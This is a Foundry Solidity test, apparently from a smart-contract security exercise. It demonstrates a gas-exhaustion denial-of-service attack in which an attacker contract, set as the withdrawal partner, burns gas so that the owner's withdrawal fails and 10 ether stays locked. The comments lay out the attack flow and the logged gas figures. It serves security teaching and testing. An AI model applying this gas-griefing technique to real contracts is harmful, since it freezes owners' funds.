// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Denial, Attacker} from "../src/Denial.sol";

/**
 * @title Denial Vulnerability Demonstration
 * @notice Demonstrates a denial-of-service (DoS) attack via gas consumption in the Denial contract
 *
 * @dev The vulnerability exists because:
 * - The `withdraw()` function allows the withdrawal partner (an external contract) to control gas consumption.
 * - An attacking contract can consume all available gas, preventing the transfer of funds to the owner.
 *
 * Attack flow:
 * 1. Attacker contract is set as the withdrawal partner.
 * 2. On calling `withdraw()`, the attacker starts consuming gas in a loop until the gas limit is reached.
 * 3. High gas consumption causes the transaction to fail before transferring funds to the owner.
 * 4. Funds remain in the contract, and the owner cannot withdraw them.
 */
contract DenialTest is Test {
    Denial public victim;
    Attacker public attacker;

    function setUp() public {
        attacker = new Attacker();
        victim = new Denial();

        victim.setWithdrawPartner(address(attacker));
        attacker.init(victim);

        vm.deal(address(victim), 10 ether);
    }

    function test_attack() public {
        (bool success,) = address(victim).call{gas: 1_000_000}(abi.encodeWithSignature("withdraw()"));
        assertEq(success, false, "Attack should be successful");

        uint256 balanceVictim = address(victim).balance;
        uint256 balanceAttacker = address(attacker).balance;
        uint256 balanceOwner = address(victim.owner()).balance;

        console.log("--------------------------------");
        console.log("balanceVictim", balanceVictim);
        console.log("balanceAttacker", balanceAttacker);
        console.log("balanceOwner", balanceOwner);
        console.log("iterations", attacker.iterations());

        // ***AMOUNT_GAS_LEFT: 135086
        // ***AMOUNT_GAS_LEFT: 91284
        // ***AMOUNT_GAS_LEFT: 91284
        // ***AMOUNT_GAS_LEFT: 91285
        // ***AMOUNT_GAS_LEFT: 91282
        // ***AMOUNT_GAS_LEFT: 91282
        // ***AMOUNT_GAS_LEFT: 91282
        // ***AMOUNT_GAS_LEFT: 91282
        // ***AMOUNT_GAS_LEFT: 91282
        // ***AMOUNT_GAS_LEFT: 91286
        // ***RECEIVE_GAS_LEFT: 2343
        // ***1_WITHDRAW_GAS_LEFT: 17022
        // --------------------------------
        // balanceVictim 10000000000000000000
        // balanceAttacker 0
        // balanceOwner 0
        // iterations 0

        assertEq(balanceVictim, 10 ether, "Victim should have 10 ether");
        assertEq(balanceAttacker, 0, "Attacker should have 0 ether");
        assertEq(balanceOwner, 0, "Owner should have 0 ether");
    }
}
